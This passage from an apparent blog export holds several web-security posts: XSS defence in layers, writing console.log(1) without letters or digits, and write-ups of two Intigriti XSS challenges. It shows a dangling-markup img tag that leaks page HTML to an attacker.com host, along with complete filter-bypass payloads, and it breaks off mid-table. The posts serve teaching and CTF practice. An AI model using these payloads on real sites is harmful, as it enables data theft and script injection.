refer to this classic presentation: Breaking XSS mitigations via Script gadgets. What if the script cannot be executed? What else can be done? Even if only HTML is inserted, there are still things that can be done. For example, you can use the HTML meta tag to cause a redirect to a malicious website, like this: &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;. Or insert &lt;img src=&quot;https://attacker.com?q= (note that only the opening double quotes are used here for src), so that the entire HTML becomes: &lt;img src=\"https://attacker.com?q= &lt;div>user info&lt;/div> &lt;div>sensitive data&lt;/div> &lt;div class=\"test\">&lt;/div> By not closing the &quot; of src, you can get the HTML content until the next &quot; and pass it as part of the query string to the server, and there may be some sensitive data in between. Therefore, the img-src CSP rule is also useful, which can prevent this type of attack. Or you can combine DOM Clobbering to see if there are any places to attack. Therefore, even if scripts cannot be executed, there are still other attack methods that can be used. GitHub wrote a post in 2017 called GitHub’s post-CSP journey, which specifically discussed how their CSP was designed to prevent known attacks. They even have a bug bounty called GitHub CSP, where you can get a reward just by proposing a method to bypass CSP, even if you don’t find an XSS. Level 3: Reduce the damage of XSS attacksIf the previous two levels fail and XSS is inevitable, the next step is to consider how to reduce the damage of XSS attacks. I think there are two aspects to consider: Avoid attackers logging in as victims Avoid attackers performing more important operations through XSS First, let’s talk about the most common attack method, stealing cookies. After stealing the document.cookie, if the user’s authentication token is inside, the attacker can log in directly as the victim. Therefore, please remember to set HttpOnly for cookies used for authentication to ensure that the front-end cannot directly obtain the cookie using document.cookie. If for some reason it is not possible to protect the user’s token, other checkpoints can be set, such as the most common location check. Assuming a user has always been in Taiwan, but suddenly makes a request in Ukraine, this operation can be blocked first, and an email can be sent to inform the user of suspicious activity and ask them to confirm if it is them. Or you can check if the user’s browser is consistent. If it is inconsistent, you still need to confirm it and add another procedure to ensure the user’s safety. Next, even if the cookie is not stolen, because the attacker can execute arbitrary code, it is still possible to directly call the backend API, and the cookie will be automatically carried. Therefore, any operation that the user can do can basically be done by the attacker through XSS. For a blog platform, posting, editing articles, or deleting articles can all be done, so the attacker only needs to use XSS to call the API directly. At this time, for some more important operations, a second checkpoint should be set, such as changing the password requires entering the original password. This way, because the attacker does not know the original password, calling the API is useless. Or when transferring money, you need to receive a verification code on your phone, and if you don’t have a phone, you cannot perform the operation. In fact, to put it more simply, it is 2FA (Two-factor authentication). For these important operations, in addition to logging in, a second mechanism that can confirm the user’s identity should be set up. Even if XSS is executed, the attacker cannot perform these operations, which can reduce the damage. SummaryThe world of information security is both wide and deep, and what is mentioned in this article is only an overview of the general direction. If you go deeper, each link can be turned into multiple independent topics, and can also be combined with other attacks, such as: Is it possible that the custom XSS filtering rules have vulnerabilities that can be bypassed? If so, how to bypass them? Even if everything is filtered, can server-side vulnerabilities actually help bypass them? For example, double encoding Is the CSP set strict enough? Are there any ready-made bypass methods? Is the 2FA mechanism fully implemented? Is the rate limit set properly? If not, will it be cracked by brute force? Is the password reset mechanism implemented correctly? Can someone else reset the password on behalf of the user? XSS is not as simple as all or nothing. Some websites may be XSS, but the scope of the impact is limited, while others may be able to easily change the user’s account password as soon as they are XSSed. When defending against XSS attacks, if only the first line of defense is considered and the only thought is “I need to escape the rendered content,” it can easily lead to the situation mentioned above. Either the entire website is secure and free from XSS attacks, or if even one XSS attack is successful, the entire website is compromised. Therefore, when defending against XSS attacks, it is important to pay attention to the different stages mentioned above and to implement multiple lines of defense for each stage. Even if an attacker can bypass the first line of defense, they may be blocked by the second line of defense, such as CSP, preventing the execution of JavaScript. Even if the second line of defense is breached, the third line of defense is still in place, reducing the impact of the XSS attack and preventing the compromise of user accounts due to a single vulnerability.","link":"/2021/06/19/en/xss-attack-and-defense/"},{"title":"How to write console.log(1) without using letters and numbers in JavaScript?","text":"IntroductionRecently, my colleagues at work took a course on information security. As I was already interested in information security, I discussed it with my colleagues, which led me to research related topics for the past two weeks. These were things I had heard of before but had not studied seriously, such as LFI (Local File Inclusion), REC (Remote code execution), SSRF (Server-Side Request Forgery), and various magical filters in PHP. I also reviewed SQL Injection and XSS, which I was already relatively familiar with. In CTF challenges, situations often arise where you need to bypass various restrictions, which is an opportunity to test your understanding of specific protocols or programming languages. You have to think about how to find at least one way to successfully bypass those restrictions under existing limitations. Originally, I didn’t know what to write about this week. I wanted to write about the things mentioned above, but I hadn’t figured out how to organize them yet. The follow-up series of “I Don’t know React” was not yet organized, so I thought it would be fun to do a little challenge related to “bypassing restrictions” with everyone. That is: In JavaScript, can you successfully execute console.log(1) without using letters and numbers? In other words, no English letters (a-zA-Z) or numbers (0-9) can appear in the code. Everything else (various symbols) is allowed. After executing the code, console.log(1) will be executed, and 1 will be printed in the console. If you have thought of any interesting services or libraries that can do this before, don’t mention them yet. Before that, you can think about it yourself and see if you can write it out, and then check other people’s solutions. If you can write it all by yourself from scratch, it means that you should be quite familiar with the JS programming language and various automatic type conversions. Below, I will provide some of my own thoughts and the process of solving this problem. There are spoilers, so don’t scroll down if you haven’t solved it yet. &#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D; &#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D;&#x3D;&#x3D; Spoiler Alert &#x3D;&#x3D; Analysis of key points for solving the problemTo successfully execute console.log(1) as required by the problem, several things must be done, such as: Find out how to execute the code How to get numbers without using letters and numbers How to get letters without using letters and numbers If these three points are all solved, the requirements of the problem should be met. Let’s first think about the first point: “How to execute the code?” Directly using console.log is impossible because even if you use a string to concatenate console, you cannot execute the function with a string like PHP. What about eval? You can put a string in eval, so you can execute any code! But the problem is that we can’t use eval because we can’t type English letters. What other methods are there? You can also use the function constructor: new Function(&quot;console.log(1)&quot;) to execute, but the problem is that we can’t use the keyword “new,” so at first glance, it doesn’t work. However, you don’t need “new” either. You can create a function that can execute specific code with Function(&quot;console.log(1)&quot;). So the next question is: How can we get the function constructor? If we can get it, we have a chance. In JS, you can use .constructor to get the constructor of something, such as &quot;&quot;.constructor, which will get: ƒ String() &#123; [native code] &#125;. If you have a function today, you can get the function constructor, like this: (()=&gt;&#123;&#125;).constructor, and because we can expect that this problem will concatenate various things with strings, we can’t use .constructor directly, so we should change it to: (()=&gt;&#123;&#125;)[&#39;constructor&#39;]. What if ES6 is not supported? What if you can’t support arrow functions? Is there a way to get a function? Yes, and it’s easy, it’s all built-in functions, such as [][&#39;fill&#39;][&#39;constructor&#39;], which is actually [].fill.constructor, or &quot;&quot;[&#39;slice&#39;][&#39;constructor&#39;], which can also get the function constructor. So this is not a difficult task, even without arrow functions. Initially, we expected the code to be like this: Function(&#39;console.log(1)&#39;)(). If we rewrite it using the method mentioned above, we will replace Function with (()=&gt;&#123;&#125;)[&#39;constructor&#39;], which becomes (()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;console.log(1)&#39;)(). Once we have this code, the problem of executing the function is solved. So, we have solved the first problem. Next, let’s think about how to generate numbers. The key here is JS coercion. If you have read some articles on JS type conversion, you may remember that &#123;&#125;+[] can give the number 0. Using the ! operator, we can get false, for example, ![] or !&#123;&#125; both give false. Then, adding two false values gives 0: ![]+![]. Similarly, ![] is false, so adding a not operator before it gives !![], which is true. Therefore, ![] + !![] is equal to false + true, which is 0 + 1, resulting in 1. There is also a shorter method. Using +[], we can get 0 through automatic type conversion. So, +!![] gives 1. Once we have 1, we can generate all numbers by adding 1 repeatedly. Alternatively, we can use bitwise operators &lt;&lt; and &gt;&gt; or multiplication. For example, to generate 8, we can use 1 &lt;&lt; 3 or 2 &lt;&lt; 2. To generate 2, we can use (+!![])+(+!![]). Therefore, (+!![])+(+!![]) &lt;&lt; (+!![])+(+!![]) gives 8, which requires only four 1s, instead of adding 8 times. However, we can ignore the length for now and focus on whether we can generate 1. Once we have 1, we have won. Finally, we need to figure out how to generate strings, or in other words, how to generate each character in (()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;console.log(1)&#39;)(). The key is coercion, just like with numbers. As mentioned earlier, ![] gives false, and adding a string to it, ![] + &#39;&#39;, gives &quot;false&quot;. This way, we can get the characters a, e, f, l, and s. For example, (![] + &#39;&#39;)[1] is a. To make it easier to remember, let’s write a small program: const mapping = &#123; a: \"(![] + '')[1]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", l: \"(![] + '')[2]\", s: \"(![] + '')[3]\", &#125; Once we have false, getting true is not difficult. !![] + &#39;&#39; gives true. So, we can modify our code to: const mapping = &#123; a: \"(![] + '')[1]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", l: \"(![] + '')[2]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; Next, we can use coercion again. Using &#39;&#39;+&#123;&#125; gives &quot;[object Object]&quot; (or you can use the magical []+&#123;&#125;). Our table can be updated as follows: const mapping = &#123; a: \"(![] + '')[1]\", b: \"(''+&#123;&#125;)[2]\", c: \"(''+&#123;&#125;)[5]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", j: \"(''+&#123;&#125;)[3]\", l: \"(![] + '')[2]\", o: \"(''+&#123;&#125;)[1]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; What happens when we get a non-existent property from an array or object? We get undefined. Adding a string to undefined gives us the string “undefined”, for example, [][&#123;&#125;]+&#39;&#39; gives undefined. After getting undefined, our conversion table becomes more complete: const mapping = &#123; a: \"(![] + '')[1]\", b: \"(''+&#123;&#125;)[2]\", c: \"(''+&#123;&#125;)[5]\", d: \"([][&#123;&#125;]+'')[2]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", i: \"([][&#123;&#125;]+'')[5]\", j: \"(''+&#123;&#125;)[3]\", l: \"(![] + '')[2]\", n: \"([][&#123;&#125;]+'')[1]\", o: \"(''+&#123;&#125;)[1]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; Looking at the conversion table and our target string, (()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;console[&quot;log&quot;](1)&#39;)(), we can see that generating constructor and console is not a problem, but we are missing the g in log. This character is not in our conversion table. Therefore, we must get the g from somewhere to generate the string we want. Alternatively, we can use another method to get the character. I thought of two methods initially. The first method is to use base conversion. When we use toString to convert a number to a string, we can specify the radix parameter, which represents the base to which the number is converted. For example, (10).toString(16) gives a because the decimal number 10 is equivalent to the hexadecimal number a. There are 26 English letters and 10 numbers, so we can use (10).toString(36) to get a and (16).toString(36) to get g. However, the problem is that toString itself has a g, which we don’t have right now, so this method won’t work. The other method I thought of is to use base64. JS has two built-in functions: btoa and atob. btoa encodes a string into base64, for example, btoa(&#39;abc&#39;) gives YWJj, and atob(&#39;YWJj&#39;) decodes it to abc. We just need to find a way to have a “g” in the result after base64 encoding. This can be achieved by running the code btoa(2)[1], which returns the string “Mg&#x3D;&#x3D;”, and taking the second character, which is “g”. However, we need to execute this code using the function constructor, like this: (()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;return btoa(2)[1]&#39;)(). To achieve this, we can use a mapping of characters to their corresponding code, and a function to transform the code into a string. We can also write a function to remove all characters from a string, leaving only the numbers. Finally, we can combine all of our efforts to produce the desired output: console.log(1) with all letters and numbers removed. However, since btoa is a Web API and not available in Node.js, we need to find another way to generate the “g” character. We can use the string constructor and add a string to it to get its contents, like this: &#39;&#39;[&#39;constructor&#39;] + &#39;&#39;, which returns the string “function String() { [native code] }”. We can then get the “g” character by using (&#39;&#39;[&#39;constructor&#39;] + &#39;&#39;)[7+7]. So far, we have used 1800 characters to successfully create a program that only contains the following 12 characters: [, ], (, ), &#123;, &#125;, &quot;, &#39;, +, !, =, &gt;, and can execute console.log(1). And because we can now get these few characters, we can use the previously mentioned method of base conversion to get any lowercase character, like this: mapping['S'] = transform(`return (''['constructor'] + '')[9]`) mapping['g'] = transform(`return (''['constructor'] + '')[7+7]`) console.log(transform('return (35).toString(36)')) // z So how do we get any uppercase character, or even any character? I have thought of a few ways. If you want to get any character, you can use String.fromCharCode, or write it in another form: &quot;&quot;[&#39;constructor&#39;][&#39;fromCharCode&#39;], to get any character. But before that, we need to figure out how to get the uppercase C. In addition to this approach, there is another one that relies on encoding, such as &#39;\\u0043&#39;, which is actually the uppercase C. So I thought I could use this method to piece it together, but it didn’t work when I tried it. For example, console.log(&quot;\\u0043&quot;) will print C correctly, but console.log((&quot;\\u00&quot; + &quot;43&quot;)) will give you an error. It seems that encoding cannot be pieced together in this way (which makes sense when you think about it). ConclusionIn fact, I have written a post before: Making JavaScript Hard to Read: jsfuck and aaencode, which talks about the same thing, but I only organized it a little bit before. This time, I tried it myself and it feels different. The conversion function that was finally written is not complete and cannot execute any code. I didn’t finish it because the jsfuck library has already written it very clearly, with a detailed description of its conversion process in the README, and it only uses 6 characters, which is really impressive. In its code, you can also see how its conversion is done. The uppercase C part uses a function called italics on the String, which can generate &lt;i&gt;&lt;/i&gt;. After generating it, call escape to escape it, and you will get %3Ci%3E%3C/i%3E, and then you have the uppercase C. Some people may think that they write their code well on a regular basis, so why bother doing this? But the point of doing this is not the final result, but to train a few things, such as: Familiarity with programming languages. We used many type conversions and built-in methods to piece things together, some of which you may have never heard of. Problem-solving and the ability to narrow down the scope. From how to execute a string as a function, to piecing together numbers and strings, step by step narrowing down the problem, solving the sub-problems, and then solving the original problem. Anyway, the above is my thought process for solving this problem. If you have any interesting solutions, please leave a comment and let me know (such as other ways to get the uppercase letter C). Thank you!","link":"/2020/12/01/en/write-conosle-log-1-without-alphanumeric/"},{"title":"Intigriti June XSS Challenge Review","text":"IntroductionI couldn’t solve the challenge for June, so I’m going to learn from other people’s writeups and review where I can improve. Code Analysis and Thought ProcessJune Challenge: https://challenge-0621.intigriti.io/ Code: const unsafeCharacters = [\"&amp;\", \"`\", \"\\\"\", \"&#123;\", \"&#125;\", \"(\", \")\", \"[\", \"]\", \"=\", \",\", \"+\"]; function sanitize(str) &#123; str += \"\"; for (let char of unsafeCharacters) &#123; str = str.replaceAll(char, `&amp;#x$&#123;char.codePointAt().toString(0x10)&#125;;`); &#125; return str; &#125; function showMessage(title = \"\", message = \"\", button = &#123; text: \"Close\", action: \"this.parentElement.parentElement.parentElement.remove();\", &#125;) &#123; let elem = (new Range).createContextualFragment(` &lt;div class=\"alert\"> &lt;div class=\"alert-inner\"> &lt;div class=\"page-bar\"> &lt;h3>$&#123;sanitize(title)&#125;&lt;/h3> &lt;button onclick=\"$&#123;sanitize(button.action)&#125;\">$&#123;sanitize(button.text)&#125;&lt;/button> &lt;/div> &lt;div class=\"page-content\"> $&#123;sanitize(message)&#125; &lt;/div> &lt;/div> &lt;/div> `); document.body.append(elem); &#125; let inputFields = &#123; passwordLength: document.getElementById(\"password-length\"), allowNumbers: document.getElementById(\"allow-numbers\"), allowSymbols: document.getElementById(\"allow-symbols\"), &#125; let generating = false; async function generate() &#123; if (generating) &#123; return; &#125; requestAnimationFrame(_ => (generating = false)); generating = true; let passwordLength = inputFields.passwordLength.value; let json = `&#123; \"passwordLength\": $&#123;passwordLength&#125;, \"seed\": $&#123;crypto.getRandomValues(new Uint32Array(1))[0]&#125;, \"allowNumbers\": $&#123;inputFields.allowNumbers.checked&#125;, \"allowSymbols\": $&#123;inputFields.allowSymbols.checked&#125; &#125;`; if (!(passwordLength = passwordLength.match(/^\\d+$/gm))) &#123; return showMessage(\"Error\", \"Password Length must be a number.\"); &#125; passwordLength = Number(passwordLength[0]); let wasm = await WebAssembly.instantiateStreaming(fetch(\"program.wasm\"), &#123; env: &#123; log_str: idx => &#123; let str = \"\"; while (u8[idx] != 0) &#123; str += String.fromCodePoint(u8[idx]); ++idx; &#125; console.log(str); &#125;, log_int: console.log, &#125;&#125;); let u8 = new Uint8Array(wasm.instance.exports.memory.buffer); let options = wasm.instance.exports.malloc(json.length + 1); let password = wasm.instance.exports.malloc(Number(passwordLength) + 1); for (let idx = 0; idx &lt; json.length; ++idx) &#123; u8[options + idx] = json.codePointAt(idx) % 0xff; &#125; u8[options + json.length] = 0; wasm.instance.exports.generate_password(options, password); let output_password = \"\"; for (let idx = 0; idx &lt; passwordLength; ++idx) &#123; output_password += String.fromCodePoint(u8[password + idx]); &#125; showMessage(\"Password Generated\", \"Your password is: \" + output_password, &#123; text: \"OK\", action: \"generateAnother();\", &#125;); &#125; function generateAnother() &#123; let params = new URLSearchParams; params.set(\"passwordLength\", inputFields.passwordLength.value); params.set(\"allowNumbers\", inputFields.allowNumbers.checked); params.set(\"allowSymbols\", inputFields.allowSymbols.checked); params.set(\"timestamp\", Number(new Date)); location.search = params; &#125; let settings = new URLSearchParams(location.search); inputFields.passwordLength.value = settings.get(\"passwordLength\") ?? 8; inputFields.allowNumbers.checked = settings.get(\"allowNumbers\") !== \"false\"; inputFields.allowSymbols.checked = settings.get(\"allowSymbols\") !== \"false\"; Basically, some parameters are taken from the query string and passed to wasm to generate a password. When I was solving this problem, I found a few places that needed to be bypassed. The first one is if (!(passwordLength = passwordLength.match(/^\\d+$/gm))) &#123;, which limits the password length to only numbers. When I saw this, I noticed that the m flag was unnecessary because it matches with line breaks, so 123\\nabc can also pass. But later, I got stuck because the value was taken from the input, and the input filters out \\n, so I couldn’t use \\n. I got stuck here. The second point where something needs to be done is the wasm part. I tried to decompile it, but I couldn’t understand what it was doing. My initial guess was to use passwordLength to modify the JSON passed in, and then fix the seed to a certain number, which would generate a feasible payload (later I found out that it wasn’t like that). But because I didn’t know what wasm was doing, I continued to look down. The generated password will be filtered, and these characters cannot be used: [&quot;&amp;&quot;, &quot;&#96;&quot;, &quot;\\&quot;&quot;, &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;[&quot;, &quot;]&quot;, &quot;&#x3D;&quot;, &quot;,&quot;, &quot;+&quot;] &lt;&gt; is not filtered, so tags can be added, but backticks and () are all filtered out, and too many characters are filtered out, so I didn’t think of a way to bypass it. That was the train of thought when I was solving the problem. I found three places where something needed to be done, but because none of them were bypassed, I couldn’t solve it. Next, let’s take a look at someone else’s writeup and do a self-review in the process. terjanqLink: How to solve an XSS challenge from Intigriti in under 60 minutes In addition to sharing the solution, this article also shares how he thought about it and solved it in under an hour, which is really impressive. His solution was to scan the code and find that there must be a problem with wasm, so he started testing how to bring it down. The testing method is to copy the code and test wasm by modifying the JSON payload. Everyone knows this method, but the direction I can review myself is that I was too lazy at the time… I always assumed that this problem was about reversing wasm, so I didn’t even try it. I had a preset position and the position was wrong, so I got stuck. Afterwards, I can actively try different methods and not be trapped in existing ideas. Then he briefly scanned wasm and found nothing hidden, and started asking himself what vulnerabilities only wasm has and not JS, and the answer was buffer overflow. Then he started testing and found that when the password length was very long, the payload would reflect the original password. After solving this part, he was sure that this part was feasible and started looking at other parts. For the part where regexp needs to be bypassed, he directly gave the characters that can be bypassed based on experience, which are &#x2F;u2028 and &#x2F;u2029. The keywords can actually be found here: Line terminators. The mistake I made at the time was giving up too early and kept thinking, “I know there may be other characters that can be line breaks, but I don’t know what they are.” I didn’t google it. After bypassing this part, he started to bypass the last restriction, which is a bunch of restricted characters. The technique used here is very cool, which is that - is not restricted, so you can use unsafeCharacters.length-- many times to shorten the array, so there are fewer restricted characters! However, in this way, the entire process needs to be triggered twice, the first time to shorten the restricted characters, and the second time to put the real payload on the screen. But once the alert appears, clicking close will refresh the webpage, and it is impossible to trigger it twice. The final solution given is: document.body.lastElementChild.outerHTML--, which destroys the newly added alert and turns it into NaN, preventing it from refreshing. Complete code: 1000\\u2029&lt;script&gt;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;document.body.lastElementChild.outerHTML--;&lt;&#x2F;script&gt;&lt;script&gt;alert()&lt;&#x2F;script&gt; You need to click generate twice to trigger it. In summary, here are the things learned: Try to break it down into paragraphs and try random things when you encounter something you don’t understand. You might break it and find the problem. Don’t assume anything. The solution may be completely different from what you think. Google is very useful. If you can’t bypass the restriction, break it. FHantkeLink: Intigriti — XSS Challenge 0621 Regarding the bypass of regexp, he wrote a simple program to fuzz it: for (i=0;i&lt;10000; i++) &#123; let passwordLength = document.getElementById(\"password-length\"); passwordLength.value = \"2\" + String.fromCharCode(i) + \"4\"; var p = passwordLength.value.match(/^\\d+$/gm); if (p) console.log(i + \" => \" + p); &#125; Yes, why didn’t I think of this? Just write a code to help you guess how to bypass it. This trick is great and must be learned. Then he tried to find a payload that could break wasm. He found that if he passed a large passwordLength and a string to allowedNumbers, it would be reflected in the generated password. Finally, he used the trick: &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;. Although it will still become: &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;, because it is wrapped in svg, the svg parser will be used to parse it, and the parsing rules are different. The original text has a DOM diagram attached. This trick is also great. I remember seeing it somewhere before. However, the final payload only works on Firefox, and I’m not sure why. The original text didn’t mention it, and I’m too lazy to check it out for now XD By the way, after writing it, I found this writeup: Intigriti’s 0621 XSS challenge - by Physuru (@cffaedfe), which also uses a lot of fuzzing to find valid payloads. This article is also worth referring to. SummaryLearned some useful tricks: Use &lt;svg&gt;&lt;script&gt;&lt;/script&gt;&lt;/svg&gt; to bypass some character encoding restrictions. Use arr.length-- to destroy arrays. Use fuzzing to find out what valid characters are. It’s simple, violent, and effective. Don’t dive into the implementation first. Try different combinations of payloads and extreme parameters.","link":"/2021/07/03/en/xss-challenge-intigriti-june-review/"},{"title":"Intigriti's 0521 XSS Challenge Solution: Limited Character Combination Code","text":"IntroductionIntigriti is a foreign bug bounty platform that releases an XSS challenge every month. Participants have about one to two weeks to think about it, and the goal is to execute alert(document.domain) on a specific website. After solving the challenge, the results are reported through the Intigriti platform, and three randomly selected winners will receive coupons for their own store. Last month’s challenge had few winners, so I was lucky enough to win a €50 coupon. It was actually a good deal because the items in the store were quite cheap. I bought a t-shirt, two hats, and international shipping for about €45. However, this kind of prize is based on luck, and solving the problem is more important than winning. The challenge URL is here: https://challenge-0521.intigriti.io/ Code Analysis The first step in solving the problem is to analyze the code and understand how the entire problem works. The homepage doesn’t look like much, and the only thing worth noting is an iframe with the URL ./captcha.php. Let’s take a look at what’s inside: &lt;body> &lt;form id=\"captcha\"> &lt;div id=\"input-fields\"> &lt;span id=\"a\">&lt;/span> &lt;span id=\"b\">+&lt;/span> &lt;input id=\"c\" type=\"text\" size=\"4\" value=\"\" required/> = &lt;span id=\"d\">&lt;/span> &lt;progress id=\"e\" value=\"0\" max=\"100\" style=\"display:none\">&lt;/progress> &lt;/div> &lt;input type=\"submit\" id=\"f\"/> &lt;input type=\"button\" onclick=\"setNewNumber()\" value=\"Retry\" id=\"g\"/> &lt;/form> &lt;/body> &lt;script> const a = document.querySelector(\"#a\"); const c = document.querySelector(\"#c\"); const b = document.querySelector(\"#b\"); const d = document.querySelector(\"#d\"); window.onload = function()&#123; setNewNumber(); document.getElementById(\"captcha\").onsubmit = function(e)&#123; e.preventDefault(); loadCalc(0); &#125;; &#125; function loadCalc(pVal)&#123; document.getElementsByTagName(\"progress\")[0].style.display = \"block\"; document.getElementsByTagName(\"progress\")[0].value = pVal; if(pVal == 100)&#123; calc(); &#125; else&#123; window.setTimeout(function()&#123;loadCalc(pVal + 1)&#125;, 10); &#125; &#125; function setNewNumber() &#123; document.getElementsByTagName(\"progress\")[0].style.display = \"none\"; var dValue = Math.round(Math.random()*1000); d.innerText = dValue; a.innerText = Math.round(Math.random()* dValue); &#125; function calc() &#123; const operation = a.innerText + b.innerText + c.value; if (!operation.match(/[a-df-z&lt;>()!\\\\='\"]/gi)) &#123; // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant) if (d.innerText == eval(operation)) &#123; alert(\"🚫🤖 Congratulations, you're not a robot!\"); &#125; else &#123; alert(\"🤖 Sorry to break the news to you, but you are a robot!\"); &#125; setNewNumber(); &#125; c.value = \"\"; &#125; &lt;/script> There are several inputs here, and when the user clicks submit, the value of c.value is passed to eval for execution. However, there are character restrictions, and the following characters cannot be used: a-df-z&lt;&gt;()!\\=&#39;&quot;. Only the letter e can be used in English letters. Therefore, the goal of this problem is very clear, which is to bypass the character restrictions and execute alert(document.domain) through eval. Full Activation(First of all, the backticks in the code in this article are full-width. This is because the markdown parser will break if they are not.) Regarding bypassing character restrictions, I wrote an article before: How to write console.log(1) without alphanumeric characters?, which came in handy this time. For example, 0/0 can generate NaN, so `$&#123;0/0&#125;`[1] can get the string a. As long as similar techniques are used, all the characters we want should be able to be generated. But I think the difficult part of this problem is not here, but at the beginning when thinking about this problem, the brain is easy to get tangled up because it is difficult to distinguish which code will be executed directly and which code will not. For example, even if you work hard to spell out the target string, when you throw it into eval, the result is actually different from what you imagined, because the structure will probably look like this: eval(&#39;&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1)&quot;&#39;) The final result will be the string alert(1), not directly executing alert(1), because what you are doing is just splicing the code you want to execute, and eval is just helping you splice it together. What if you spell out eval again? eval(&#39;&quot;eval(a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1))&quot;&#39;) This is also useless, and only the string eval will appear. The reason why this is not possible is because what you are splicing is a string within a string. For example, please see the following two code snippets: eval(&#39;alert(1)&#39;)eval(&#39;&quot;alert(1)&quot;&#39;) The former will pop up an alert, and the latter will output the string alert. This is because the latter is a “string within a string”. If you use string concatenation, it will definitely be like this. Therefore, if you need to execute code, we must have something that does not need to be spliced. In JS, the following can be used to execute strings as code: eval function constructor setTimeout setInterval location Among them, what meets our needs is the function constructor! Why is this so? Because we can access this thing without accessing it directly through a string! First, let me briefly explain the function constructor, which is Function(), which can dynamically generate functions. Then Function is Function.prototype.constructor, so you can use the prototype chain plus an array to access it: [][&#39;constructor&#39;][&#39;constructor&#39;] === Function // true With this, you can dynamically create and execute functions! Like this: [][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)() So why can it be executed after being put into eval like this? Because [] is not composed of strings, so when put into eval, it will be like this: eval(&quot;[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()&quot;) In this way, you can dynamically execute code through the function constructor inside eval, which is the meaning of the title “Full Activation” of this chapter, layer by layer. However, in addition to finding alternative strings, there is another problem, that is, function calls cannot use (), what should we do? Tagged templatesIf you have used styled components in React, you should be familiar with this syntax: const Box = styled.div` background: red; ` In fact, styled.div is a function, and then the function is called with backticks. Yes, backticks can also call functions, but it should be noted that the passing of parameters will be different from what you think. You will know it by doing a simple demonstration: function noop(...args) &#123; console.log(args) &#125; noop`1` // [[\"1\"]] noop`$&#123;'abc'&#125;`// [[\"\", \"\"], \"abc\"] noop`1$&#123;'abc'&#125;2` // [[\"1\", \"2\"], \"abc\"] noop`1$&#123;'a'&#125;2$&#123;'b'&#125;3$&#123;'c'&#125;` // [[\"1\", \"2\", \"3\", \"\"], \"a\", \"b\", \"c\"] If you call a function with backticks, the first parameter will be an array containing all the normal strings, separated by $&#123;&#125; in the middle, and all the contents you put in $&#123;&#125; afterwards are the second parameter and beyond. More examples can be found in: [Note] Template Strings (template literals) and Tagged Templates in JavaScript ES6 Rewriting our code with backticks would look like this: []['constructor']['constructor']`$&#123;'alert(1)'&#125;`` But if you execute it like this, you will find that there is an error. Because according to what we said above, if you write like this, the parameter passed to the function constructor will be: [&quot;&quot;], &#39;alert(1)&#39;, the first parameter is an array containing an empty string. Except for the last parameter, the function constructor will treat everything else as the parameter of the function to be dynamically added. For example, Function(&#39;a&#39;, &#39;b&#39;, &#39;return a+b&#39;) is: function (a, b) &#123; return a+b &#125; So giving an empty string as the first parameter is not feasible, just add a variable, such as the allowed e or _ in the question: []['constructor']['constructor']`_$&#123;'alert(1)'&#125;``｀ // 產生出的函式 function anonymous(_,) &#123; alert(1) &#125; In this way, the code can be executed smoothly, so the only thing left is to spell out constructor and alert(document.domain). String SpellingIn addition to the article I mentioned at the beginning: How to write console.log(1) without alphanumeric characters?, there are many places in the code of jsfuck that can be referenced. Here are a few I used: 1. `$&#123;``+&#123;&#125;&#125;` => \"[object Object]\" 2. `$&#123;``[0]&#125;` => \"undefined\" 3. `$&#123;e&#125;` => \"[object HTMLProgressElement]\" 4. `$&#123;0/0&#125;` => \"NaN\" We can find all the required characters from the above combinations. The only thing left is the last two, (), we must also spell them out to get them. How to get them? If you turn a function into a string in JS, it will be the entire content of the function, like this: `$&#123;[]['constructor']&#125;` => \"function Array() &#123; [native code] &#125;\" You can get these two characters () from here. Combining the above techniques, I wrote a simple program to generate the final result: const mapping = &#123; a: '`$&#123;0/0&#125;`[1]', c: '`$&#123;``+&#123;&#125;&#125;`[5]', d: '`$&#123;``[0]&#125;`[2]', e: '`e`', i: '`$&#123;``[0]&#125;`[5]', l: '`$&#123;e&#125;`[21]', m: '`$&#123;e&#125;`[23]', n: '`$&#123;``[0]&#125;`[1]', o: '`$&#123;``+&#123;&#125;&#125;`[1]', r: '`$&#123;e&#125;`[13]', s: 